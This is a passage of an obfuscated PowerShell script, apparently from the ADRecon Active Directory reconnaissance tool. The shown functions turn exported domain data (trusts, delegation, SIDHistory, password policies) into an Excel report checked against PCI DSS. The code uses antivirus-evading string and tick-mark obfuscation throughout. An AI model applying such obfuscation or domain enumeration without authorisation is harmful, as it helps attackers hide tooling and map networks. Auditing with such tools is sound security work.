        [Parameter(MAndaTOry = $true)]
        [string] $SrcSheetName,

        [Parameter(mANdaTorY = $true)]
        [string] $PivotTableName,

        [Parameter(mAnDaTOrY = $false)]
        [array] $PivotRows,

        [Parameter(mAndatoRy = $false)]
        [array] $PivotColumns,

        [Parameter(mandatory = $false)]
        [array] $PivotFilters,

        [Parameter(MANDatoRY = $false)]
        [array] $PivotValues,

        [Parameter(mAnDATOry = $false)]
        [array] $PivotPercentage,

        [Parameter(MAndatOry = $false)]
        [string] $PivotLocation = ("{0}{1}" -f'R1','C1')
    )

    $excel."SCReenu`pDa`TI`Ng" = $false
    $SrcWorksheet = $workbook."sh`e`Ets".("{0}{1}"-f 'Ite','m').Invoke($SrcSheetName)
    $workbook."shOW`pI`V`OTtabL`E`F`IeLdL`iSt" = $false

    
    
    
    
    
    

    
    
    $PivotFailed = $false
    Try
    {
        $PivotCaches = $workbook.("{0}{2}{1}"-f 'Pi','Caches','vot').Invoke()."CRE`Ate"(  $ejHQ::"XLD`A`TaB`Ase", $SrcWorksheet."uS`eD`RANGe",   (  ls  ("vaRiab"+"L"+"E:gr"+"P") ).vAlue::"X`Lp`iVottABlE`V`e`Rsion12")
    }
    Catch
    {
        $PivotFailed = $true
        Write-Verbose ("{1}{6}{2}{7}{8}{5}{3}{4}{0}"-f 'd','[P','otC',' F','aile','.Create]','iv','aches','()')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
    If ( $PivotFailed -eq $true )
    {
        $rows = $SrcWorksheet."Use`dRa`NGe"."Ro`ws"."c`OuNt"
        If ($SrcSheetName -eq ("{3}{4}{2}{1}{0}"-f 's','SPN','r ','C','ompute'))
        {
            $PivotCols = ("{1}{0}" -f '1:C','A')
        }
        ElseIf ($SrcSheetName -eq ("{0}{1}{2}"-f'Comp','ut','ers'))
        {
            $PivotCols = ("{1}{0}"-f'1:F','A')
        }
        ElseIf ($SrcSheetName -eq ("{0}{1}"-f'Us','ers'))
        {
            $PivotCols = ("{0}{1}"-f'A1',':C')
        }
        $UsedRange = $SrcWorksheet.("{1}{0}"-f'e','Rang').Invoke($PivotCols+$rows)
        $PivotCaches = $workbook.("{2}{1}{3}{0}" -f 'hes','ivo','P','tCac').Invoke()."Cr`eaTE"(  (  VaRIABLE ('EjH'+'q') ).VaLue::"xLd`A`TabasE", $UsedRange,  $Grp::"x`LpIvOTTABlEVE`Rs`I`O`N12")
        Remove-Variable rows
	    Remove-Variable PivotCols
        Remove-Variable UsedRange
    }
    Remove-Variable PivotFailed
    $PivotTable = $PivotCaches.("{0}{2}{3}{4}{1}"-f 'Create','e','PivotT','ab','l').Invoke($PivotLocation,$PivotTableName)
    

    If ($PivotRows)
    {
        ForEach ($Row in $PivotRows)
        {
            $PivotField = $PivotTable.("{0}{1}{2}" -f'P','ivotField','s').Invoke($Row)
            $PivotField."orI`E`NtATi`On" =   ( iTeM vArIABle:gjq).vALUe::"Xlro`WF`iEld"
        }
    }

    If ($PivotColumns)
    {
        ForEach ($Col in $PivotColumns)
        {
            $PivotField = $PivotTable.("{2}{1}{0}" -f 'Fields','ivot','P').Invoke($Col)
            $PivotField."orIenTA`T`I`on" =  $Gjq::"XLc`O`lumnfield"
        }
    }

    If ($PivotFilters)
    {
        ForEach ($Fil in $PivotFilters)
        {
            $PivotField = $PivotTable.("{0}{2}{1}"-f 'Pi','ds','votFiel').Invoke($Fil)
            $PivotField."ORIENt`AT`IOn" =  (GET-VARiable  gjQ  -vA)::"XLp`AgeF`i`ELD"
        }
    }

    If ($PivotValues)
    {
        ForEach ($Val in $PivotValues)
        {
            $PivotField = $PivotTable.("{0}{2}{1}" -f'Pivo','Fields','t').Invoke($Val)
            $PivotField."orI`ENt`ATI`On" =  $gJq::"xLDA`TaFi`elD"
        }
    }

    If ($PivotPercentage)
    {
        ForEach ($Val in $PivotPercentage)
        {
            $PivotField = $PivotTable.("{2}{1}{3}{0}" -f 's','tFiel','Pivo','d').Invoke($Val)
            $PivotField."or`iEnta`TIoN" =  ( LS  VaRIaBLe:GJq ).vaLUe::"xL`Da`TaFIeLd"
            $PivotField."CaLC`Ulat`IoN" =   (  iTEM  ("v"+"a"+"RiABl"+"e:"+"gNh8")  ).Value::"XLPEr`CenTOF`TO`TaL"
            $PivotTable."shoW`VAlu`Esr`Ow" = $false
        }
    }

    
    $excel."scre`E`NupdaTI`Ng" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotField
    Remove-Variable PivotField
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTable
    Remove-Variable PivotTable
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotCaches
    Remove-Variable PivotCaches
    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
}

Function Get-ADRExcelAttributeStats
{

    param (
        [Parameter(mAnDatORY = $true)]
        [string] $SrcSheetName,

        [Parameter(maNdATOrY = $true)]
        [string] $Title1,

        [Parameter(MANDaTOry = $true)]
        [string] $PivotTableName,

        [Parameter(MANdatORy = $true)]
        [string] $PivotRows,

        [Parameter(mAndATory = $true)]
        [string] $PivotValues,

        [Parameter(MANDATORy = $true)]
        [string] $PivotPercentage,

        [Parameter(MAndATOry = $true)]
        [string] $Title2,

        [Parameter(MaNDAtOrY = $true)]
        [System.Object] $ObjAttributes
    )

    $excel."sCReE`Nu`PDAtI`NG" = $false
    $worksheet = $workbook."WOr`kshe`EtS".("{1}{0}"-f'm','Ite').Invoke(1)
    $SrcWorksheet = $workbook."SH`E`eTs".("{0}{1}" -f 'It','em').Invoke($SrcSheetName)

    $row = 1
    $column = 1
    $worksheet."Ce`lLs".("{0}{1}"-f 'Ite','m').Invoke($row, $column) = $Title1
    $worksheet."ce`lLS".("{1}{0}" -f 'tem','I').Invoke($row,$column)."STY`LE" = ("{0}{1}{2}"-f 'Head','ing ','2')
    $worksheet."C`ElLs".("{0}{1}"-f'It','em').Invoke($row,$column)."Ho`RizO`NtA`LALig`NM`eNT" = -4108
    $MergeCells = $worksheet.("{0}{1}"-f 'Ra','nge').Invoke(("{0}{1}" -f 'A1:','C1'))
    $MergeCells.("{0}{1}" -f 'Se','lect').Invoke() | Out-Null
    $MergeCells."mERgEcE`L`lS" = $true
    Remove-Variable MergeCells

    Get-ADRExcelPivotTable -SrcSheetName $SrcSheetName -PivotTableName $PivotTableName -PivotRows @($PivotRows) -PivotValues @($PivotValues) -PivotPercentage @($PivotPercentage) -PivotLocation ("{1}{0}" -f'2C1','R')
    $excel."S`C`Re`EnUpDATING" = $false

    $row = 2
    ("{1}{0}"-f 'ype','T'),("{1}{0}"-f 'nt','Cou'),("{1}{2}{0}" -f 'age','Perce','nt') | ForEach-Object {
        $worksheet."ceL`Ls".("{0}{1}" -f 'It','em').Invoke($row, $column) = $_
        $worksheet."CEl`ls".("{0}{1}"-f 'I','tem').Invoke($row, $column)."F`ONT"."b`OLD" = $True
        $column++
    }

    $row = 3
    $column = 1
    For($row = 3; $row -le 6; $row++)
    {
        $temptext = [string] $worksheet."c`ElLS".("{1}{0}" -f 'tem','I').Invoke($row, $column)."T`EXt"
        switch ($temptext.("{2}{1}{0}"-f 'per','oUp','T').Invoke())
        {
            ("{0}{1}"-f 'TRU','E') { $worksheet."cE`Lls".("{1}{0}"-f 'm','Ite').Invoke($row, $column) = ("{0}{2}{1}" -f 'E','ed','nabl') }
            ("{0}{1}" -f'FAL','SE') { $worksheet."cE`LLS".("{1}{0}" -f 'em','It').Invoke($row, $column) = ("{2}{0}{1}" -f 'isable','d','D') }
            ("{0}{2}{1}{3}" -f'GR','OT','AND T','AL') { $worksheet."CeL`LS".("{0}{1}" -f'I','tem').Invoke($row, $column) = ("{1}{0}" -f 'al','Tot') }
        }
    }

    If ($ObjAttributes)
    {
        $row = 1
        $column = 6
        $worksheet."C`eLLs".("{0}{1}" -f 'I','tem').Invoke($row, $column) = $Title2
        $worksheet."C`ELls".("{1}{0}" -f 'em','It').Invoke($row,$column)."St`yLE" = ("{1}{2}{0}" -f '2','Headi','ng ')
        $worksheet."C`ELlS".("{0}{1}" -f 'It','em').Invoke($row,$column)."H`o`RiZoNTaL`ALiGNmeNt" = -4108
        $MergeCells = $worksheet.("{0}{1}" -f'Ra','nge').Invoke(("{1}{0}"-f '1','F1:L'))
        $MergeCells.("{1}{0}" -f 't','Selec').Invoke() | Out-Null
        $MergeCells."MeRGec`e`lLs" = $true
        Remove-Variable MergeCells

        $row++
        ("{0}{2}{1}"-f'C','ory','ateg'),("{1}{0}{2}{3}" -f'bled','Ena',' Coun','t'),("{2}{0}{4}{1}{3}"-f 'd','ntag','Enable','e',' Perce'),("{4}{0}{3}{2}{1}" -f'ed','ount','C',' ','Disabl'),("{1}{0}{4}{5}{3}{2}"-f 'sabl','Di','e','entag','ed P','erc'),("{2}{1}{0}" -f'Count','l ','Tota'),("{1}{2}{4}{0}{3}"-f'cen','T','ot','tage','al Per') | ForEach-Object {
            $worksheet."CeL`ls".("{1}{0}" -f'm','Ite').Invoke($row, $column) = $_
            $worksheet."Ce`LLs".("{0}{1}"-f 'I','tem').Invoke($row, $column)."fo`Nt"."b`OlD" = $True
            $column++
        }
        $ExcelColumn = ($SrcWorksheet."c`OLum`Ns".("{0}{1}" -f 'Fin','d').Invoke(("{0}{2}{1}"-f'Ena','d','ble')))
        $EnabledColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        $column = 6
        $i = 2

        $ObjAttributes."KE`yS" | ForEach-Object {
            $ExcelColumn = ($SrcWorksheet."c`OlUmNs".("{1}{0}" -f'nd','Fi').Invoke($_))
            $ColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
            $row++
            $i++
            If ($_ -eq ("{2}{0}{1}" -f'n Ty','p','Delegatio'))
            {
                $worksheet."Ce`llS".("{0}{1}" -f 'I','tem').Invoke($row, $column) = ("{2}{0}{6}{1}{5}{4}{3}" -f 'trained ','a','Uncons','n','io','t','Deleg')
            }
            ElseIf ($_ -eq ("{3}{2}{1}{0}" -f 'on Type','ti','ga','Dele'))
            {
                $worksheet."CEl`LS".("{0}{1}"-f'It','em').Invoke($row, $column) = ("{4}{3}{0}{1}{2}" -f'De','le','gation','strained ','Con')
            }
            Else
            {
                $worksheet."ce`Lls".("{0}{1}"-f'It','em').Invoke($row, $column)."FOrmU`la" = "='" + $SrcWorksheet."NA`mE" + "'!" + $ExcelColumn.("{0}{1}" -f'Add','ress').Invoke($false,$false)
            }
            $worksheet."Cel`ls".("{1}{0}"-f 'tem','I').Invoke($row, $column+1)."FoRm`U`la" = ((("{0}{2}{1}{3}"-f '=C','FS(f','OUNTI','Ad'))."REPLa`cE"('fAd',[STRInG][ChAr]39)) + $SrcWorksheet."n`AME" + "'!" + $EnabledColAddress + ((("{1}{0}{2}" -f'0}TRUE{0}',',{',',')) -F [CHAr]34) + "'" + $SrcWorksheet."NA`ME" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet."c`Ells".("{0}{1}"-f 'It','em').Invoke($row, $column+2)."fORM`ULA" = ((("{2}{0}{1}" -f 'IFERRO','R(G','='))) + $i + (((("{1}{8}{7}{2}{3}{10}{6}{0}{5}{9}{4}" -f '3:B6,2,','/','UP(','{0}Enabl',')','FALSE)',',A','OOK','VL',',0','ed{0}'))-F [cHAR]34))
            $worksheet."Ce`LlS".("{1}{0}" -f 'em','It').Invoke($row, $column+3)."f`ORM`ULA" = (((("{2}{0}{3}{1}"-f 'OUNTIFS','0}','=C','({'))-F [CHAR]39)) + $SrcWorksheet."n`AMe" + "'!" + $EnabledColAddress + ((("{1}{3}{0}{4}{2}" -f '3b',',3bIFA',',','LSE','I'))-crEPLAce ([CHar]51+[CHar]98+[CHar]73),[CHar]34) + "'" + $SrcWorksheet."nA`ME" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet."cEL`LS".("{1}{0}"-f 'em','It').Invoke($row, $column+4)."ForM`ULA" = ((("{0}{1}{2}"-f '=IFE','RROR(','I'))) + $i + ((("{7}{2}{6}{4}{3}{1}{0}{5}"-f 'L','A','OKUP(V','cp,A3:B6,2,F','edV','SE),0)','cpDisabl','/VLO'))."RePLA`cE"('Vcp',[striNg][chAr]34))
            If ( ($_ -eq ("{3}{0}{1}{2}" -f'H','i','story','SID')) -or ($_ -eq ("{1}{0}{3}{2}" -f'eato','ms-ds-Cr','id','rS')) )
            {
                
                $worksheet."cE`LLS".("{1}{0}" -f'tem','I').Invoke($row, $column+5)."fO`RmU`LA" = (((("{1}{0}"-f'0}','=COUNTIF({')) -f[cHaR]39)) + $SrcWorksheet."na`mE" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')-1'
            }
            Else
            {
                $worksheet."cEL`lS".("{0}{1}"-f 'Ite','m').Invoke($row, $column+5)."FOrMU`lA" = ((("{2}{3}{0}{1}" -f'NTIF(jq','i','=','COU'))."re`pLACe"('jqi',[sTrINg][chaR]39)) + $SrcWorksheet."nA`ME" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            }
            $worksheet."Ce`LLs".("{1}{0}"-f 'em','It').Invoke($row, $column+6)."F`ormU`LA" = ((("{0}{1}{2}"-f '=IF','E','RROR(K'))) + $i + (((("{8}{1}{5}{7}{6}{2}{4}{9}{3}{10}{0}"-f'0)','VL','W','2','TotalL','O','(LM','OKUP','/','MW,A3:B6,',',FALSE),'))  -CrEplace  ([CHaR]76+[CHaR]77+[CHaR]87),[CHaR]34))
        }

        
        "H", "J" , "L" | ForEach-Object {
            $rng = $_ + $($row - $ObjAttributes."C`Ount" + 1) + ":" + $_ + $($row)
            $worksheet.("{0}{1}"-f 'R','ange').Invoke($rng)."numbeRFO`RM`AT" = ("{0}{1}"-f '0','.00%')
        }
    }
    $excel."SC`R`eeNU`pdAtiNG" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelChart
{

    param (
        [Parameter(mAndATory = $true)]
        [string] $ChartType,

        [Parameter(MANDAtORY = $true)]
        [int] $ChartLayout,

        [Parameter(maNDatORY = $true)]
        [string] $ChartTitle,

        [Parameter(MAnDATOry = $true)]
        $RangetoCover,

        [Parameter(ManDatory = $false)]
        $ChartData = $null,

        [Parameter(MANdAtorY = $false)]
        $StartRow = $null,

        [Parameter(MaNDATORy = $false)]
        $StartColumn = $null
    )

    $excel."SC`REeNUpDAT`Ing" = $false
    $excel."DisP`lAY`AlEr`Ts" = $false
    $worksheet = $workbook."wOrKS`h`eETS".("{0}{1}"-f 'Ite','m').Invoke(1)
    $chart = $worksheet."Sh`APEs".("{0}{1}{2}" -f 'AddCh','ar','t').Invoke()."ch`Art"
    
    $chart."c`HArt`TY`pe" = [int](  $yVmjzK::$ChartType)
    $chart.("{2}{0}{1}"-f'pp','lyLayout','A').Invoke($ChartLayout)
    If ($null -eq $ChartData)
    {
        If ($null -eq $StartRow)
        {
            $start = $worksheet.("{1}{0}" -f 'e','Rang').Invoke("A1")
        }
        Else
        {
            $start = $worksheet.("{1}{0}"-f'ange','R').Invoke($StartRow)
        }
        
        $X = $worksheet."RaN`ge"($start,$start."e`Nd"( $nJl::"XL`Down"))
        If ($null -eq $StartColumn)
        {
            $start = $worksheet.("{1}{0}"-f'ange','R').Invoke("B1")
        }
        Else
        {
            $start = $worksheet.("{0}{1}" -f'Ra','nge').Invoke($StartColumn)
        }
        
        $Y = $worksheet."r`AngE"($start,$start."E`Nd"(  (  LS VarIABle:nJL  ).VAlUE::"x`LdO`wn"))
        $ChartData = $worksheet.("{0}{1}"-f'Ra','nge').Invoke($X,$Y)

        Get-ADRExcelComObjRelease -ComObjtoRelease $X
        Remove-Variable X
        Get-ADRExcelComObjRelease -ComObjtoRelease $Y
        Remove-Variable Y
        Get-ADRExcelComObjRelease -ComObjtoRelease $start
        Remove-Variable start
    }
    $chart.("{1}{2}{0}"-f 'urceData','SetS','o').Invoke($ChartData)
    
    $chart."pl`O`TbY" =  $egkqx5::"xlCOL`UMns"
    $chart.("{0}{2}{1}"-f'se','ion','riesCollect').Invoke(1).("{0}{1}"-f'S','elect').Invoke() | Out-Null
    $chart.("{4}{1}{2}{3}{0}"-f 'n','eri','esCo','llectio','S').Invoke(1).("{2}{1}{3}{4}{0}" -f'bels','D','Apply','ataL','a').Invoke() | out-Null
    
    $chart."hA`s`TitlE" = $True
    $chart."CHA`Rtt`I`TLe"."T`exT" = $ChartTitle
    
    $temp = $worksheet.("{0}{1}"-f'Ran','ge').Invoke($RangetoCover)
    
    $chart."P`A`RENT"."t`oP" = $temp."T`oP"
    $chart."P`AR`EnT"."lE`Ft" = $temp."lE`Ft"
    $chart."P`ARENt"."w`idtH" = $temp."Wi`dtH"
    If ($ChartTitle -ne ("{1}{6}{4}{5}{0}{2}{3}"-f' Groups','Privil',' ','in AD','ge','d','e'))
    {
        $chart."Pa`REnt"."h`Ei`gHT" = $temp."H`EigHT"
    }
    
    $excel."SCreEN`UPDAt`ing" = $true
    $excel."diSPLAY`AleR`TS" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $chart
    Remove-Variable chart
    Get-ADRExcelComObjRelease -ComObjtoRelease $ChartData
    Remove-Variable ChartData
    Get-ADRExcelComObjRelease -ComObjtoRelease $temp
    Remove-Variable temp
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelSort
{

    param (
        [Parameter(mAndaTOrY = $true)]
        [string] $ColumnName
    )

    $worksheet = $workbook."worK`Sh`Ee`TS".("{1}{0}" -f'tem','I').Invoke(1)
    $worksheet.("{1}{0}" -f'te','Activa').Invoke();

    $ExcelColumn = ($worksheet."CO`lUmNs".("{0}{1}" -f 'Fi','nd').Invoke($ColumnName))
    If ($ExcelColumn)
    {
        If ($ExcelColumn."t`ext" -ne $ColumnName)
        {
            $BeginAddress = $ExcelColumn.("{0}{1}{2}"-f 'Add','re','ss').Invoke(0,0,1,1)
            $End = $False
            Do {
                
                $ExcelColumn = ($worksheet."CoLu`M`NS".("{1}{0}"-f'ndNext','Fi').Invoke($ExcelColumn))
                $Address = $ExcelColumn.("{2}{1}{0}" -f's','s','Addre').Invoke(0,0,1,1)
                If ( ($Address -eq $BeginAddress) -or ($ExcelColumn."t`Ext" -eq $ColumnName) )
                {
                    $End = $True
                }
            } Until ($End -eq $True)
        }
        If ($ExcelColumn."TE`Xt" -eq $ColumnName)
        {
            
            $workSheet."L`istoBJeC`Ts".("{1}{0}"-f 'm','Ite').Invoke(1)."S`orT"."soRtf`ie`LDS".("{1}{0}" -f'r','Clea').Invoke()
            $workSheet."lI`st`Ob`jecTs".("{0}{1}" -f'It','em').Invoke(1)."s`OrT"."SO`Rt`FIElDS".("{0}{1}"-f 'Ad','d').Invoke($ExcelColumn) | Out-Null
            $worksheet."li`S`ToBj`eCTS".("{1}{0}"-f 'tem','I').Invoke(1)."s`ort".("{1}{0}"-f'y','Appl').Invoke()
        }
        Else
        {
            Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
        }
    }
    Else
    {
        Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Export-ADRExcel
{

    param(
        [Parameter(ManDatorY = $true)]
        [string] $ExcelPath
    )

    $ExcelPath = $((Convert-Path $ExcelPath).("{1}{0}" -f'imEnd','Tr').Invoke("\"))
    $ReportPath = -join($ExcelPath,'\',("{1}{0}{2}" -f'l','CSV-Fi','es'))
    If (!(Test-Path $ReportPath))
    {
        Write-Warning ("{9}{5}{7}{6}{1}{11}{8}{3}{10}{4}{2}{0}"-f'ting',' not loc','ectory ... Exi',' CSV-Fil','ir','-ADR','uld','Excel] Co','e','[Export','es d','ate th')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    Get-ADRExcelComObj
    If ($excel)
    {
        Write-Output ("{2}{5}{3}{1}{8}{4}{7}{6}{9}{0}"-f 'x',' AD','[*] Ge','rating','on-Repo','ne','t','r','Rec','.xls')

        $ADFileName = -join($ReportPath,'\',("{0}{3}{1}{4}{2}" -f 'Ab','DRec','n.csv','outA','o'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $workbook."W`Orkshe`EtS".("{0}{1}" -f'I','tem').Invoke(1)."n`AME" = ("{2}{1}{0}"-f'Recon','D','About A')
            $workbook."wOR`KSHe`ETs".("{1}{0}"-f 'tem','I').Invoke(1)."h`y`pErL`iNKS".("{1}{0}"-f'd','Ad').Invoke($workbook."W`o`RKs`hEETS".("{1}{0}"-f 'm','Ite').Invoke(1)."cEL`lS".("{1}{0}"-f 'em','It').Invoke(3,2) , ("{3}{1}{2}{0}{4}{6}{7}{5}" -f'/gi','p','s:/','htt','thub','Recon','.com/adr','econ/AD'), "" , "", ("{5}{3}{2}{6}{4}{0}{7}{1}" -f'con/ADR','con','m','thub.co','adre','gi','/','e')) | Out-Null
            $workbook."w`OrKSHE`ETS".("{0}{1}" -f 'Ite','m').Invoke(1)."US`ED`RANGe"."e`NtIrE`colu`Mn".("{0}{1}"-f'Au','toFit').Invoke() | Out-Null
        }

        $ADFileName = -join($ReportPath,'\',("{0}{3}{2}{1}" -f 'F','v','.cs','orest'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{2}{0}"-f 'est','Fo','r')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{0}{1}" -f 'main.','csv','Do'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}" -f'm','ain','Do')
            Get-ADRExcelImport -ADFileName $ADFileName
            $DomainObj = Import-CSV -Path $ADFileName
            Remove-Variable ADFileName
            $DomainName = -join($DomainObj[0]."Va`LuE","-")
            Remove-Variable DomainObj
        }

        $ADFileName = -join($ReportPath,'\',("{2}{1}{0}"-f'v','sts.cs','Tru'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{2}{0}"-f 'sts','Tr','u')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{0}"-f 'csv','Subn','ets.'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f'ts','Subne')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{0}{1}"-f 'it','es.csv','S'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f 'ites','S')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{3}{2}{5}{0}{1}{4}"-f'i','sto','he','Sc','ry.csv','maH'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{2}{1}"-f'Sc','tory','hemaHis')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{4}{0}{1}{2}{3}"-f 'rainedP','ass','wor','dPolicy.csv','FineG'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{4}{0}{8}{5}{6}{3}{2}{1}{7}" -f 'ine','d','swor','Pas','F','ined',' ',' Policy',' Gra')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}{5}{6}{4}{2}{3}"-f 'Def','au','y','.csv','c','ltPasswo','rdPoli'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{2}{1}{3}"-f 'Defa',' ','ult Password','Policy')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $excel."s`C`Re`EnUPdATiNG" = $false
            $worksheet = $workbook."W`or`KshEEts".("{0}{1}" -f 'I','tem').Invoke(1)
            
            $worksheet.("{0}{1}"-f'Ra','nge').Invoke(("{1}{0}" -f'10','B2:G'))."h`orIz`ont`ALAligNmENT" = -4108
            

            ("{2}{1}{0}"-f 'B10','2:','A'), ("{1}{0}" -f '0','C2:D1'), ("{0}{1}" -f 'E2:','F10'), ("{2}{1}{0}" -f '10','2:G','G') | ForEach-Object {
                $worksheet.("{1}{0}" -f 'ge','Ran').Invoke($_).("{0}{1}{2}"-f 'B','o','rderAround').Invoke(1) | Out-Null
            }

            
            
            
            

            $ObjValues = @(
            
            "C2", (("{4}{3}{2}{1}{0}" -f'SE)','L','A','B2<4,TRUE, F','=IF('))

            
            "C3", ("{1}{2}{0}{3}{5}{4}{6}{7}"-f 'R(B3=0,B3>9','=','IF(O','0),','S','TRUE, FAL','E',')')

            

            
            "C5", (("{4}{2}{1}{3}{0}" -f 'ALSE)','<7,T','F(B5','RUE, F','=I'))

            
            "C6", ("{1}{4}{6}{3}{5}{0}{2}" -f 'U','=IF(B6<','E, FALSE)','UE','>',',TR','TR')

            

            
            "C8", ((("{4}{3}{1}{0}{6}{5}{2}" -f')','30',')','D(B8>=1,B8<','=IF(AN',' FALSE',',TRUE,')))

            
            "C9", (("{0}{6}{7}{2}{3}{8}{4}{1}{5}"-f '=I','FALS','(B9=0,B9>6)',',TRU',', ','E)','F(','OR','E'))

            

            
            "E2", (("{4}{3}{2}{0}{1}" -f'RUE, F','ALSE)','T','IF(B2<8,','='))

            
            "E3", (("{7}{9}{0}{6}{4}{1}{8}{2}{3}{5}"-f'R(B','0)','TR','UE, FALS','=0,B3>9','E)','3','=',',','IF(O'))

            
            "E4", (("{0}{3}{5}{2}{6}{4}{1}"-f '=','E)','(B','I','S','F','4=0,TRUE, FAL'))

            
            "E5", (("{1}{3}{4}{2}{0}"-f',TRUE, FALSE)','=I','3','F(','B5<1'))

            
            "E6", (("{2}{3}{0}{5}{4}{1}" -f 'B6<','FALSE)','=I','F(','RUE, ','>TRUE,T'))

            

            

            
            "E9", (("{6}{0}{7}{4}{2}{5}{1}{3}"-f'IF(OR','R','=0,B9>5','UE, FALSE)','9','),T','=','(B'))

            

            
            "G2", (("{3}{2}{5}{4}{1}{6}{0}" -f 'SE)',', FA','2','=IF(B',',TRUE','<24','L'))

            
            "G3", ((("{6}{5}{0}{3}{2}{1}{7}{4}" -f'0),','UE','R','T',' FALSE)','3=0,B3>6','=IF(OR(B',',')))

            
            "G4", ("{0}{1}{2}{3}{4}" -f '=IF(B4=0,TRU','E,',' F','A','LSE)')

            
            "G5", (("{1}{3}{4}{2}{5}{0}" -f 'SE)','=IF(B5<1',',','4,TR','UE',' FAL'))

            
            "G6", ("{0}{1}{3}{4}{2}"-f '=IF','(B6<',')','>','TRUE,TRUE, FALSE')

            
            "G7", (("{5}{4}{3}{1}{0}{2}"-f'FALS','TRUE, ','E)','ALSE,','IF(B7<>F','='))

            
            "G8", (("{5}{0}{7}{4}{3}{6}{2}{1}"-f 'AND','E)','RUE, FALS','<1','B8','=IF(','5),T','(B8>=1,'))

            
            "G9", ((("{8}{5}{4}{1}{6}{7}{0}{2}{3}" -f 'AL','R','S','E)','0),T','1','UE',', F','=IF(OR(B9=0,B9>')))

            
            "G10", ("{6}{3}{4}{0}{1}{2}{5}" -f '10<1','5,T','RUE, FALSE','F','(B',')','=I') )

            For ($i = 0; $i -lt $($ObjValues."COu`NT"); $i++)
            {
                $worksheet."R`AnGE"($ObjValues[$i])."FOrMATcO`NDI`TI`ons"."A`dd"(  ( VaRiAblE DBJ67 ).value::"xLExP`R`ES`SiON", 0, $ObjValues[$i+1]) | Out-Null
                $i++
            }

            "C2", "C3" , "C5", "C6", "C8", "C9", "E2", "E3" , "E4", "E5", "E6", "E9", "G2", "G3", "G4", "G5", "G6", "G7", "G8", "G9", "G10" | ForEach-Object {
                $worksheet.("{0}{1}"-f'Rang','e').Invoke($_)."fORmaTC`o`Nd`iT`IONs".("{0}{1}"-f'I','tem').Invoke(1)."S`TOP`iF`TrUE" = $false
                $worksheet.("{0}{1}" -f 'Rang','e').Invoke($_)."fo`RmaTCO`N`dITI`ons".("{0}{1}" -f'I','tem').Invoke(1)."FO`Nt"."CO`LoRi`NDEx" = 3
            }

            $workbook."Wor`K`SH`Eets".("{1}{0}" -f 'm','Ite').Invoke(1)."HYPE`Rl`InkS".("{1}{0}" -f'd','Ad').Invoke($workbook."w`oRkS`heets".("{1}{0}"-f'm','Ite').Invoke(1)."c`ELLs".("{0}{1}" -f'I','tem').Invoke(1,4) , ("{15}{6}{1}{10}{11}{9}{12}{4}{13}{8}{3}{5}{14}{0}{2}{7}" -f 'nt=','ww.pc','pci_ds','=p','ar','cidss&docum','tps://w','s','y','tandards.org/document_','is','ecuritys','libr','y?categor','e','ht'), "" , "", ("{1}{3}{0}{2}" -f 'DSS v3.2.','PC','1','I ')) | Out-Null
